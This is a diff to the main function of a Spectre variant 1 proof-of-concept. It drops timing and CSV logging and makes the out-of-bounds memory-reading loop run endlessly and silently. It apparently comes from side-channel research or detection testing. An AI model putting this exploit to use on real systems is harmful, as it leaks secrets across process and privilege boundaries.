@@ -134,37 +134,33 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
 
 int main(int argc, const char **argv)
 {
-  std::ofstream output("output-attack.csv");
-  size_t malicious_x = (size_t)(secret - (char *)array1); /* default for malicious_x */
-  int i, score[2], len = 40;
-  uint8_t value[2];
+  while (true) {
+    size_t malicious_x = (size_t)(secret - (char *)array1); /* default for malicious_x */
+    int i, score[2], len = 40;
+    uint8_t value[2];
+  
+    for (i = 0; i < sizeof(array2); i++)
+      array2[i] = 1; /* write to array2 to ensure it is memory backed */
+    if (argc == 3)
+    {
+      sscanf(argv[1], "%p", (void **)(&malicious_x));
+      malicious_x -= (size_t)array1; /* Input value to pointer */
+      sscanf(argv[2], "%d", &len);
+    }
+  
+    // printf("Reading %d bytes:\n", len);
+    while (--len >= 0)
+    {
+      // printf("Reading at malicious_x = %p... ", (void *)malicious_x);
+      readMemoryByte(malicious_x++, value, score);
+      // printf("%s: ", score[0] >= 2 * score[1] ? "Success" : "Unclear");
+      // printf("0x%02X='%c' score=%d ", value[0], (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
+      // if (score[1] > 0)
+      //   printf("(second best: 0x%02X score=%d)", value[1], score[1]);
+      // printf("\n");
+    }
 
-  for (i = 0; i < sizeof(array2); i++)
-    array2[i] = 1; /* write to array2 to ensure it is memory backed */
-  if (argc == 3)
-  {
-    sscanf(argv[1], "%p", (void **)(&malicious_x));
-    malicious_x -= (size_t)array1; /* Input value to pointer */
-    sscanf(argv[2], "%d", &len);
   }
-
-  std::chrono::milliseconds start = std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::system_clock::now().time_since_epoch());
-
-  // printf("Reading %d bytes:\n", len);
-  while (--len >= 0)
-  {
-    // printf("Reading at malicious_x = %p... ", (void *)malicious_x);
-    readMemoryByte(malicious_x++, value, score);
-    // printf("%s: ", score[0] >= 2 * score[1] ? "Success" : "Unclear");
-    // printf("0x%02X='%c' score=%d ", value[0], (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
-    // if (score[1] > 0)
-    //   printf("(second best: 0x%02X score=%d)", value[1], score[1]);
-    // printf("\n");
-  }
-
-  std::chrono::milliseconds end = std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::system_clock::now().time_since_epoch());
-
-  output << "attack start;attack end\n";
-  output << start.count() << ";" << end.count() << "\n";
+  
   return (0);
 }
